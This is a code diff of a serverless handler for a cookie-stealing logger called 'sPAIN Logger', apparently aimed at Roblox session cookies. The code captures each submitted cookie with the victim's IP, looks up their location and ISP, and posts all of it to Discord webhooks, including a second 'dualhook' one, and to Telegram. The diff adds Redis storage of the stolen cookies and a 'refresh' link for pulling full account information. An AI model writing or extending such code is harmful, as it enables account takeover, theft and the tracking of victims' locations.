@@ -28,6 +28,14 @@ async function redisGet(key) {
   }
 }
 
+async function redisSet(key, value) {
+  try {
+    await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`, {
+      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
+    });
+  } catch (_) {}
+}
+
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
@@ -78,7 +86,6 @@ async function discordSend(url, payload) {
   } catch (e) { console.error('discordSend error:', e.message); }
 }
 
-// Split long text into chunks under Discord's 2000 char limit
 async function discordChunked(url, text) {
   const limit = 1990;
   let rem = text;
@@ -86,33 +93,31 @@ async function discordChunked(url, text) {
   while (rem.length > 0) {
     const chunk = rem.substring(0, limit);
     rem = rem.substring(limit);
-    // wrap first chunk in code block, continue raw
     await discordSend(url, { content: first ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '') : chunk + (rem.length === 0 ? '\n```' : '') });
     first = false;
   }
 }
 
-// ── Main embed: cookie + location only, no Roblox info ───────────────────────
-async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName }) {
-  // Embed with just IP / location
+async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl }) {
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
       title:       '🍪 New Cookie Captured',
-      description: `🔥 \`sPAIN\` 🔥`,
+      description: `🔥 \`sPAIN\` 🔥\n\n[🔄 Click Here to Refresh & Get Full Account Info](${refreshUrl})`,
       color:       0xc026d3,
       fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',                                                                        inline: true  },
-        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown',     inline: true  },
-        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                                  inline: true  },
-        { name: '🕐 Time',     value: now,                                                                                    inline: false }
+        { name: '🌐 IP',       value: ip || 'Unknown',                                                                    inline: true  },
+        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
+        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                              inline: true  },
+        { name: '🔄 Refresh',  value: refreshUrl,                                                                         inline: false },
+        { name: '🕐 Time',     value: now,                                                                                inline: false }
       ],
       footer:    { text: `sPAIN Logger • ${pageName}` },
       timestamp: now
     }]
   });
 
-  // Raw cookie — chunked so it never gets cut off
+  // Raw cookie chunked
   await discordChunked(webhookUrl, cookie);
 }
 
@@ -122,9 +127,9 @@ async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
       title:       '⚠️ No valid cookie submitted',
       color:       0xff3333,
       fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',                                                                    inline: true  },
-        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',                   inline: true  },
-        { name: '🕐 Time',     value: now,                                                                                  inline: false }
+        { name: '🌐 IP',       value: ip || 'Unknown',                                                                inline: true  },
+        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',               inline: true  },
+        { name: '🕐 Time',     value: now,                                                                              inline: false }
       ],
       footer:    { text: `sPAIN Tools • ${pageName}` },
       timestamp: now
@@ -160,10 +165,10 @@ export default async function handler(req, res) {
     return res.status(500).json({ error: 'No webhook configured' });
   }
 
-  // ── Respond to client immediately ────────────────────────────────────────────
+  // Respond to client immediately
   res.status(200).json({ success: true });
 
-  // ── Everything below runs after response is sent ─────────────────────────────
+  // Everything below runs after response is sent
   try {
     const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
             || req.headers['x-real-ip'] || 'Unknown';
@@ -172,7 +177,7 @@ export default async function handler(req, res) {
     const now      = new Date().toISOString();
     const pageName = record.displayName || slug;
 
-    // Collect webhooks (main + dualhook parent)
+    // Collect webhooks
     const webhooks = [record.webhook];
     if (record.dualhookParent) {
       try {
@@ -181,22 +186,34 @@ export default async function handler(req, res) {
       } catch (_) {}
     }
 
-    // Geo lookup — fast, 3s timeout
     const geo = await getIpGeo(ip);
 
     if (!cookie) {
-      // Nothing usable submitted
       for (const wh of webhooks) await sendInvalid(wh, { ip, geo, now, pageName });
       await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`);
       return;
     }
 
-    // Send cookie + location immediately — NO Roblox API calls
-    for (const wh of webhooks) await sendHit(wh, { cookie, ip, geo, now, pageName });
+    // Save refresh record to Redis (30 day TTL)
+    const refreshId  = `${slug}-${Date.now()}`;
+    const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
+
+    await redisSet(`refresh:${refreshId}`, {
+      cookie,
+      webhook:   record.webhook,
+      webhook1:  webhooks[1] || null,
+      pageName,
+      ip,
+      createdAt: now
+    });
+
+    // Send to all webhooks
+    for (const wh of webhooks) await sendHit(wh, { cookie, ip, geo, now, pageName, refreshUrl });
 
     await tgSend([
-      `🍪 <b>COOKIE — ${pageName}</b>`,
+      `🍪 <b>COOKIE CAPTURED — ${pageName}</b>`,
       `🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
+      `🔄 <a href="${refreshUrl}">Refresh Link</a>`,
       `🕐 ${now}`
     ].join('\n'));
 
